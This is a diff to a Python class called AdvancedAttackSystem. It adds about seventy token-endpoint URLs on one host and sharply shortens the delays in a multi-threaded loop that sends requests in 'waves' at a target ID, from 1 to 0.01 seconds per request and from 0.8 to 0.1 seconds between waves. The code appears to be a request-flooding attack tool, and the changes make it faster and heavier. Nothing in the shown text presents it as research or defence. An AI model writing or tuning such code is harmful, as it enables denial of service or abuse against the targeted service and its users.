@@ -29,6 +29,77 @@ class AdvancedAttackSystem:
         
         self.api_urls = [
             "https://r1-acc-jwt.vercel.app/2a97793c9079a6d0d2c59c0f7a2aff3ec5618fca6edb870dc839c37ab35039d4",
+            "https://r1-acc-jwt.vercel.app/47b43ac93afd549620ced3136eded96c13d6a7946ec2b8c497fa794d4c6f73dc",
+            "https://r1-acc-jwt.vercel.app/53c37ceb3540643f541a72e1e653a08b2f65dfc0a67fa209bc2860d9807ff6d6",
+            "https://r1-acc-jwt.vercel.app/0b04971d49f24acb738078827db1d03a3c6cbd198c40f468ee6f8cd382447e9f",
+            "https://r1-acc-jwt.vercel.app/96f854d09d10a96f0f6a8ca5e1d248edc5b2cb936583b4777a14543f0de134ac",
+            "https://r1-acc-jwt.vercel.app/9ca9c7dd7861767478c42dbaa574f4f1bf4867333721f859571f4f62d233df68",
+            "https://r1-acc-jwt.vercel.app/4ce92b73d053a79ed8d6a7efe1e22f1e814e340bcbf9c032615582189db711c9",
+            "https://r1-acc-jwt.vercel.app/d65b5ee57af4c87b26987cd1960557411c04e19998f2c1b687de3b006bc7fea7",
+            "https://r1-acc-jwt.vercel.app/c59e77ecb83d5ce74a549d3488eaec48fc0682be3fadf35c571d8b54f1f36ddd",
+            "https://r1-acc-jwt.vercel.app/7210839056dd0e7b2013d978d6679d3ec8206a62b83f5fbb198265d2b1e57c50",
+            "https://r1-acc-jwt.vercel.app/20b117de0b2d84670c05f2bd6b8072c6d4c32035e858053882073dfad367b76c",
+            "https://r1-acc-jwt.vercel.app/af3b7df50de5486d8ceded09b57421e9569f37b18a9144fd2a9335bf922cff27",
+            "https://r1-acc-jwt.vercel.app/7a27d15d7caaaa2082f88dac135d88cd8487ffc9a0372888cb12c80b6da23947",
+            "https://r1-acc-jwt.vercel.app/3ec377148c4b1edd0d920ef9add50f6722c0e61ed31c1eb0e237d788affcd494",
+            "https://r1-acc-jwt.vercel.app/9c4cd4c91803fc9ba3f37350bb1e197ddfe8f4d788ee8ec9b453380cf7e75f7f",
+            "https://r1-acc-jwt.vercel.app/cb6f2c51347139fea72cc4e02a34388e2bed6d2290f81d8b01ef1a8ce3a94968",
+            "https://r1-acc-jwt.vercel.app/593a6adc78a90ded008a0c9f8a59cfd425fb0a250ee7494d6112f87535a3f046",
+            "https://r1-acc-jwt.vercel.app/534b55b28fc3e644b40cebc0387c05decf93158f3a4a39aae9613bbec55cb9da",
+            "https://r1-acc-jwt.vercel.app/957e6ebd7785fad4cf9ca245f976c39dad8816194d3ce3c173bf48f47868f1a6",
+            "https://r1-acc-jwt.vercel.app/e3fe12f02288566d3337fc908c2aafd10cc603dfb89e42254f689b3cecf34d12",
+            "https://r1-acc-jwt.vercel.app/71ff15e475882afe531ef43fb6aea25606bd34a5bd4ed0006131b3f16c13b862",
+            "https://r1-acc-jwt.vercel.app/bc8018e81948a2356679ee626682256017653b7165da85bb78467ea586de5dad",
+            "https://r1-acc-jwt.vercel.app/7d514086188c2e1c267f17dcfdfda5095e77f6ca5399ecbf9c5fc049f569ee73",
+            "https://r1-acc-jwt.vercel.app/a9dd7698202cae26481661b8490bcc50ce74f9a8edb7ad1c26bc39435ebe6cf1",
+            "https://r1-acc-jwt.vercel.app/bc1224698a477cffb464493e7d3cbb597009c1f5b541f17501ff04cc4696a378",
+            "https://r1-acc-jwt.vercel.app/f81013d72c6f03801d16174175f0a2cd3d5a6dbc3a59a8396233d5cd294a5425",
+            "https://r1-acc-jwt.vercel.app/2ae8d579b87c44f07f77f6cc764b00bf159e01e43c02b859f035c916fb49f332",
+            "https://r1-acc-jwt.vercel.app/58c7015bbac5cb11d2d575178138ef41a9707681ba7e8aa6f285f1727518a8b1",
+            "https://r1-acc-jwt.vercel.app/382f33cedfe4212f284730416ad1c944aaf135cc658a1580299558a3240bde46",
+            "https://r1-acc-jwt.vercel.app/e47c95d4ba8c9e587600934c33944493636c6d2df7582460e41f9762b8388ca3",
+            "https://r1-acc-jwt.vercel.app/93b5c321d7ad25ba5f860a7ad8b8f379098df1ac9ba1651344681fe449ce5c18",
+            "https://r1-acc-jwt.vercel.app/07e194fcc67545f4d9629400837c5163bf30ecbcf1e79d41a2fe74f85ee3632f",
+            "https://r1-acc-jwt.vercel.app/d57b77cf9c98a1b39fbd354639bbe535d7574a7b4bc9f646ef7ea87f37f6e960",
+            "https://r1-acc-jwt.vercel.app/9c1b4437f139dd5cf953121415cbea6e788c8ec32945839ac703807c09054319",
+            "https://r1-acc-jwt.vercel.app/daf716c379bdfb18676fd9e0bcba9588b208c1937c4ed7639b8d90d27fa070da",
+            "https://r1-acc-jwt.vercel.app/bb3c63ec84552b91ead16391d26f190fc69745c9db1bbd2221211a59f6d61baa",
+            "https://r1-acc-jwt.vercel.app/d612dbf8fa72b6f4ead40a86b99dadd1f8cc9d8de9383a72fc8885bf2bbdf0af",
+            "https://r1-acc-jwt.vercel.app/05d748371dde56d52c3cc13e0e8cdc667d4200731c0e7043264863b873b79cbc",
+            "https://r1-acc-jwt.vercel.app/db451ccb5d3f905cd623830a25bc869293016bd10c8733241450a6b0cae7c9af",
+            "https://r1-acc-jwt.vercel.app/0c8bcba0260a6e1012e646f60337531985716dde0f584f778514e5ac766506ff",
+            "https://r1-acc-jwt.vercel.app/94edb438ad144307e15b9be642d8b63e1e571da2e6e7f267fc04581856e09c9c",
+            "https://r1-acc-jwt.vercel.app/b2b6a02c71e31605c5f44397a40cc27daddcf578835b129956b55c6860066b73",
+            "https://r1-acc-jwt.vercel.app/282136c8f0540658261163657b9b37e16ffe75de319196e173fd8da694bd4db5",
+            "https://r1-acc-jwt.vercel.app/0cad102393d6b8f9979d7cf2e6f1bde0ca76d66331f803a76cc9e379275b9f05",
+            "https://r1-acc-jwt.vercel.app/70d9a616ee4a6b806f456b23cff346f92517b14ac35c3e6cdfe6f1291931d78d",
+            "https://r1-acc-jwt.vercel.app/db22f4a4f092bae79ea6be4ac518df2144a6ead1adf37ab80cb90aaabe9474d9",
+            "https://r1-acc-jwt.vercel.app/4c2d28caca35a6890ab551b2195a076044223f12dbf2828c9a812cdfb5b857c6",
+            "https://r1-acc-jwt.vercel.app/3e7e9d86499445b810c9d5bd1d6fe1410185551b5678efe5886343c69985cbd5",
+            "https://r1-acc-jwt.vercel.app/e394b4ea58b3d2cf85309a72414d7f1eefeeb91ec100a80f282e3fc036cecc76",
+            "https://r1-acc-jwt.vercel.app/d3755e5c7f64d12ab237ff4ea2b8e04ba3b33b58047d28a58aeabe96707cfd38",
+            "https://r1-acc-jwt.vercel.app/cd4070884175a813a4af3293a81bdae5db9196a2d8028b4dfc1c30bcd4895d98",
+            "https://r1-acc-jwt.vercel.app/b85a427d728c96401f6f02c7a85be700fec420b603099d241247c09db96e0a6a",
+            "https://r1-acc-jwt.vercel.app/e382335c73aa49ced88f3929fde72867e803a5e03d5a002cd40ba24df80ff9c5",
+            "https://r1-acc-jwt.vercel.app/651a2e009c9fa9846d8cd3eacc7a680bb1669e8bef8a20bbe68977d1f1e9014e",
+            "https://r1-acc-jwt.vercel.app/ddeafb60718cec5eb2b4539bf1450dba7d857502681c10b9de60bb818e5c192c",
+            "https://r1-acc-jwt.vercel.app/f62be0b5873bb441c70c7cd87c43138ec1fc67a3d7e04cf749744edfab8a7a9f",
+            "https://r1-acc-jwt.vercel.app/f853afc3a120356ff8fd5b16fb2884af17f38e3164354fac246e29444a3b2cc0",
+            "https://r1-acc-jwt.vercel.app/78d90f4d4509d32a91d5e37021c2d0cd48c407d52e53e22916d69c8c48177419",
+            "https://r1-acc-jwt.vercel.app/6904377d91d5e3d17620f9ca9449cb85fbc1601e6a4ccd51901bd57ff50f2b81",
+            "https://r1-acc-jwt.vercel.app/b5ed33d11ac14f106256cfecad3d58e70fc89f6f53ee95e82d56b1126e189e3c",
+            "https://r1-acc-jwt.vercel.app/a17954605b3a27f8c64ce3d615b5748f6996e7bd43ef06192949e89c9959ee6d",
+            "https://r1-acc-jwt.vercel.app/5dbe188ed9f85994095fd2a0757df237244010b446a6c0be9b4396c9d11a4e4d",
+            "https://r1-acc-jwt.vercel.app/342c9b0e6215d9a95f2c91d6b462537fc96ba4c4ee7db6b76e61a78d8a00db44",
+            "https://r1-acc-jwt.vercel.app/1a7523406b49f163f5bfd178477971903ab8e2ba1356f15dba8edc6e139a5b32",
+            "https://r1-acc-jwt.vercel.app/89d13045b11a162c648f2b0897f2570a4a444f75684c5068c224c29220e63d38",
+            "https://r1-acc-jwt.vercel.app/71b3fda329c86c771db2809c4c15081f0b9485e220934a692b4ae0cc4a777e3e",
+            "https://r1-acc-jwt.vercel.app/e9c6d6c9f1306c27f228e83a1b969a8f2806fef4e11365a847f58afe225f317e",
+            "https://r1-acc-jwt.vercel.app/c2b35140c6827e98bbda21f5ca958a5685fa14aac7eba2707fc574c43e3e28f9",
+            "https://r1-acc-jwt.vercel.app/a058d4c6c966513a18948b3b92e550cedfce60d3fd33672c1b535c785ff3dabc",
+            "https://r1-acc-jwt.vercel.app/6a99cbe4e70e1e33bda1d07327e454541d728fd1cb93979ab4c13c7f51847091",
+            "https://r1-acc-jwt.vercel.app/bb8f24c5a2061a5d71ba077ac0f801ade0982eedb33a7f7ea9ed7427bfc7fa8d",
+            "https://r1-acc-jwt.vercel.app/bd3f1c35b18dfcfa046898e0d313951d8846a0e34b0d86e9ba0801366aaf5387",
             "https://r1-acc-jwt.vercel.app/84fa005d5dbb93f12b58eb15e9aa7066732d91ccfd5c4af42cf4a2623c72f623",
             "https://r1-acc-jwt.vercel.app/55276a7c417834bef7de7f2777cde089b177671d7514dce7cd966e0a71a12281",
             "https://r1-acc-jwt.vercel.app/c008f4c8f0de93f31eae737a52b04179342deb66306ac76782fdc4636119284b",
@@ -44,10 +115,7 @@ class AdvancedAttackSystem:
             "https://r1-acc-jwt.vercel.app/975ea16d5615dbaaa65ffc42d260b105de15493fc3e53452dc30a7fe654bf3d6",
             "https://r1-acc-jwt.vercel.app/97817559bda08696f984a72f0a411129b641c598440a61787916df7150bacd92",
             "https://r1-acc-jwt.vercel.app/b19ee0beb6548c369e0c30f7e51216efb8bbb8d813d35bc6232dda2074d31eb0",
-            "https://r1-acc-jwt.vercel.app/20b117de0b2d84670c05f2bd6b8072c6d4c32035e858053882073dfad367b76c",
-
             "https://r1-acc-jwt.vercel.app/c8b23f36bbeb2e0719f15feb8f059f05875d994f863c824f0bc42aac1a90b715"
-        
         
         
         ]
@@ -118,7 +186,7 @@ class AdvancedAttackSystem:
             while time.time() < pulse_end_time and not stop_event.is_set():
                 token = random.choice(tokens_for_wave)
                 self.send_request(session, target_id, token)
-                time.sleep(1) 
+                time.sleep(0.01) 
             
             
             if not stop_event.is_set():
@@ -145,7 +213,7 @@ class AdvancedAttackSystem:
             all_threads.append(wave_thread)
             wave_thread.start()
             print(f"  -> Wave {i+1} launched...")
-            time.sleep(0.8) 
+            time.sleep(0.1) 
 
         return stop_event, all_threads
 
